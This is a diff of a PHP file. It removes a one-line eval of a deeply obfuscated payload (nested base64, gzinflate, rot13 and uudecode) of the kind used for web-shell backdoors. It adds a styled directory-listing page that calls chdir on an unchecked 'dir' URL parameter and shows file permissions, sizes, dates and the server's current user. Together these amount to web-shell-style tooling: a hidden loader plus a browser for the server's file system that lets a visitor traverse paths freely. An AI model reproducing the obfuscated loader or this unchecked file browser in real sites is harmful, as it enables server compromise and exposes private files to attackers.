@@ -1,2 +1,350 @@
 <?php
-eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('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')))))));
+    date_default_timezone_set('Asia/Jakarta');
+    $ignore_file_list = array( ".htaccess", "Thumbs.db", ".DS_Store", "index.php" );
+    $ignore_ext_list = array( );
+    $sort_by = "name_asc";
+    $icon_url = "https://image.flaticon.com/icons/svg/833/833524.svg";
+    $toggle_sub_folders = true;
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title><?php echo get_current_user(); ?></title>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@500&display=swap');
+        *, *:before, *:after {
+            -moz-box-sizing: border-box; 
+            -webkit-box-sizing: 
+            border-box; box-sizing: 
+            border-box; 
+        }
+        body { 
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400; 
+            font-size: 14px; 
+            line-height: 18px; 
+            padding: 0; 
+            margin: 0; 
+            background: #f5f5f5; 
+        }
+        .wrap { 
+            max-width: 600px; 
+            margin: 20px auto; 
+            background: white; 
+            padding: 40px; 
+            box-shadow: 0 0 2px #ccc; 
+        }
+        @media only screen and (max-width: 700px) { 
+            .wrap { 
+                padding: 15px; 
+                } 
+            }
+        a { 
+            color: #399ae5; 
+            text-decoration: none; 
+        } 
+        a:hover { 
+            color: #206ba4; 
+            text-decoration: none; 
+        }
+        .note { 
+            padding:  0 5px 25px 0; 
+            font-size:80%; 
+            color: #666; 
+            line-height: 18px; 
+        }
+        .block { 
+            clear: both;  
+            min-height: 50px; 
+            border-top: solid 1px #ECE9E9; 
+        }
+        .block:first-child { 
+            border: none; 
+        }
+        .block .img { 
+            width: 50px; 
+            height: 50px; 
+            display: block; 
+            float: left; 
+            margin-right: 10px; 
+        }
+        .block .date { 
+            margin-top: 4px; 
+            font-size: 70%; 
+            color: #666; 
+        }
+        .block a { 
+            display: block; 
+            padding: 10px 15px; 
+            transition: all 0.35s; 
+        }
+        .block a:hover { 
+            text-decoration: none; 
+            background: #efefef; 
+        }
+        .jpg, .jpeg, .gif, .png { 
+            background-position: -50px 0 !important; 
+        }
+        .pdf { 
+            background-position: -100px 0 !important; 
+        }
+        .txt, .rtf { 
+            background-position: -150px 0 !important; 
+        }
+        .xls, .xlsx { 
+            background-position: -200px 0 !important; 
+        }
+        .ppt, .pptx { 
+            background-position: -250px 0 !important; 
+        }
+        .doc, .docx { 
+            background-position: -300px 0 !important; 
+        }
+        .zip, .rar, .tar, .gzip { 
+            background-position: -350px 0 !important; 
+        }
+        .swf { 
+            background-position: -400px 0 !important; 
+        }
+        .fla { 
+            background-position: -450px 0 !important; 
+        }
+        .mp3 { 
+            background-position: -500px 0 !important; 
+        }
+        .wav { 
+            background-position: -550px 0 !important; 
+        }
+        .mp4 { 
+            background-position: -600px 0 !important; 
+        }
+        .mov, .aiff, .m2v, .avi, .pict, .qif { 
+            background-position: -650px 0 !important; 
+        }
+        .wmv, .avi, .mpg { 
+            background-position: -700px 0 !important; 
+        }
+        .flv, .f2v { 
+            background-position: -750px 0 !important; 
+        }
+        .psd { 
+            background-position: -800px 0 !important; 
+        }
+        .ai { 
+            background-position: -850px 0 !important; 
+        }
+        .html, .xhtml, .dhtml, .php, .asp, .css, .js, .inc { 
+            background-position: -900px 0 !important; 
+        }
+        .dir { 
+            background-position: -950px 0 !important; 
+        }
+        .sub { 
+            margin-left: 20px; 
+            border-left: solid 1px #ECE9E9; 
+            display: none; 
+        }
+
+    </style>
+</head>
+<body>
+<div class="wrap">
+<?php
+if (isset($_GET['dir'])) {
+    chdir($_GET['dir']);
+}
+function cleanTitle($title) {
+    return ucwords( str_replace( array("-", "_"), " ", $title) );
+}
+
+function getFileExt($filename) {
+    return substr( strrchr( $filename,'.' ),1 );
+}
+
+function format_size($file) {
+    $bytes = filesize($file);
+    if ($bytes < 1024) return $bytes.'b';
+    elseif ($bytes < 1048576) return round($bytes / 1024, 2).'kb';
+    elseif ($bytes < 1073741824) return round($bytes / 1048576, 2).'mb';
+    elseif ($bytes < 1099511627776) return round($bytes / 1073741824, 2).'gb';
+    else return round($bytes / 1099511627776, 2).'tb';
+}
+
+function ext($file) {
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    switch ($ext) {
+        case is_dir($ext):
+            print("https://image.flaticon.com/icons/svg/716/716784.svg");
+            break;
+        case 'php':
+            print("https://image.flaticon.com/icons/png/128/337/337947.png");
+            break;
+        
+        default:
+            print("https://image.flaticon.com/icons/svg/833/833524.svg");
+            break;
+    }
+}
+
+function perms($file){
+    $perms = @fileperms($file);
+
+if (($perms & 0xC000) == 0xC000) { $info = 's'; } 
+elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } 
+elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } 
+elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } 
+elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } 
+elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } 
+elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } 
+else { $info = 'u'; }
+
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ? 
+         (($perms & 0x0800) ? 's' : 'x' ) :
+         (($perms & 0x0800) ? 'S' : '-'));
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+         (($perms & 0x0400) ? 's' : 'x' ) :
+         (($perms & 0x0400) ? 'S' : '-'));
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+         (($perms & 0x0200) ? 't' : 'x' ) :
+         (($perms & 0x0200) ? 'T' : '-'));
+return $info;
+}
+
+function permission($file, $perms) {
+    switch ($file) {
+        case is_writable($file):
+            return "<span style='color:green;'>".$perms."</span>";
+            break;
+        
+        case is_readable($file):
+            return "<span style='color:red;'>".$perms."</span>";
+            break;
+    }
+}
+
+function size($file) {
+    if (is_dir($file)) {
+        $filename = "";
+    } elseif (is_file($file)) {
+        $filename = "Size : ".format_size($file);
+    } return $filename;
+}
+
+function display_block( $files ) {
+    global $ignore_file_list, $ignore_ext_list;
+    
+    $file = getcwd().DIRECTORY_SEPARATOR.$files;
+    $file_ext = getFileExt($file);
+    if( !$file_ext AND is_dir($file)) {
+        $file_ext = "dir"; 
+    } if(in_array($file, $ignore_file_list)) {
+        return;
+    } if(in_array($file_ext, $ignore_ext_list)) {
+        return;
+    }
+
+    ?>
+    <div class=block>
+    <a href="<?= basename($file) ?>" class="<?= $file_ext ?>">
+        <div class="img"><img width="50px" height="50px" src="<?= ext($file) ?>"></div>
+        <div class="name">
+            <div class="file"><?= basename($file) ?>
+                <div class="date">
+                    <table>
+                        <tr>
+                            <td><?= size($file) ?></td>
+                            <td><?= permission($file, perms($file)) ?></td>
+                            <td><?= date("D. F jS, Y - h:ia", filemtime($file)) ?></td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+      </div>
+      </a>
+    </div>
+    <?php
+}
+
+function build_blocks( $items, $folder ) {
+    global $ignore_file_list, $ignore_ext_list, $sort_by, $toggle_sub_folders;
+    $objects = array();
+    $objects['directories'] = array();
+    $objects['files'] = array();
+
+    foreach($items as $c => $item) {
+        if( $item == ".." OR $item == ".") continue;
+        if(in_array($item, $ignore_file_list)) {
+            continue;
+        }
+
+        if( $folder ) {
+            $item = "$folder/$item";
+        }
+        $file_ext = getFileExt($item);
+        if(in_array($file_ext, $ignore_ext_list)) {
+            continue;
+        } if( is_dir($item) ) {
+            $objects['directories'][] = $item;
+            continue;
+        }
+        $file_time = date("U", filemtime($item));
+        $objects['files'][$file_time . "-" . $item] = $item;
+    }
+
+    foreach($objects['directories'] as $c => $file) {
+        display_block( $file );
+        if($toggle_sub_folders) {
+            $sub_items = (array) scandir( $file );
+            if( $sub_items ) {
+                echo "<div class='sub' data-folder=\"$file\">";
+                build_blocks( $sub_items, $file );
+                echo "</div>";
+            }
+        }
+    }
+
+    if( $sort_by == "date_asc" ) {
+        ksort($objects['files']);
+    } elseif( $sort_by == "date_desc" ) {
+        krsort($objects['files']);
+    } elseif( $sort_by == "name_asc" ) {
+        natsort($objects['files']);
+    } elseif( $sort_by == "name_desc" ) {
+        arsort($objects['files']);
+    }
+
+    foreach($objects['files'] as $t => $file) {
+        $fileExt = getFileExt($file);
+        if(in_array($file, $ignore_file_list)) {
+            continue;
+        } if(in_array($fileExt, $ignore_ext_list)) { 
+            continue; 
+        } display_block( $file );
+    }
+}
+
+$items = scandir( getcwd() );
+build_blocks( $items, false );
+?>
+
+<?php if($toggle_sub_folders) { ?>
+<script>
+    $(document).ready(function() {
+        $("a.dir").click(function(e) {
+            $('.sub[data-folder="' + $(this).attr('href') + '"]').slideToggle();
+            e.preventDefault();
+        });
+    });
+</script>
+<?php } ?>
+</div>
+</body>
+</html>
